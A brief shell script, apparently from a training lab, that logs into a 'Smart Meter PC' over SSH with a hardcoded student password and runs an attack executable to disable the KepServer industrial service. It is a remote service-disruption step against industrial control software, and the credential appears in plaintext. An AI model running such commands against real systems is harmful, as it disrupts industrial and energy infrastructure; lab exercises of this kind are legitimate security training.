#!/bin/sh

# Description: This file/script demostrates the disabling of KepServer Service on the Smart Meter PC
# Tag: Disable Smart Meter Service   
sshpass -p 'Student12345@' ssh -o ConnectTimeout=5 student@172.16.2.223 "C:\Windows\Temp\SmartMetertest\AttackScript.exe 5"
